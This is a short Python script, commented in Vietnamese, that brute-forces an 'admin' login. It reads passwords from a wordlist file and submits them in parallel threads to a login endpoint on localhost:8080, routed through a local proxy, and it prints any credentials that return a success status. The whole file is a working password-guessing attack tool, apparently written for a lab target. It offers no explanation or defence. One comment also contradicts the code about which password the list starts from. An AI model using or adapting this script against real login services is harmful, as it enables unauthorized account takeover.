import concurrent.futures
from requests import post

url = "http://localhost:8080/processLogin"

file = input("Enter file path: ")

# Hàm xử lý đăng nhập
def try_login(password):
    username = "admin"
    response = post(url, data={'username': username, 'password': password}, proxies={'http': 'http://localhost:8888'})
    if response.status_code == 200:
        print("Login success")
        print("Username: ", username)
        print("Password: ", password)
        return True
    else:
        return False

# Đọc file và sử dụng đa luồng để xử lý các password
with open(file, 'r', encoding='utf-8', errors='ignore') as f:  # Sử dụng UTF-8 và bỏ qua lỗi giải mã
    passwords = [line.strip() for line in f]

# Lấy từ password hello1
passwords = passwords[passwords.index("emerald") + 1:]

# Sử dụng ThreadPoolExecutor để xử lý đa luồng
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Gửi các password vào hàm try_login để xử lý song song
    futures = [executor.submit(try_login, password) for password in passwords]
    
    # Kiểm tra kết quả
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            break  # Nếu login thành công, dừng kiểm tra thêm
    else:
        print("Login failed")
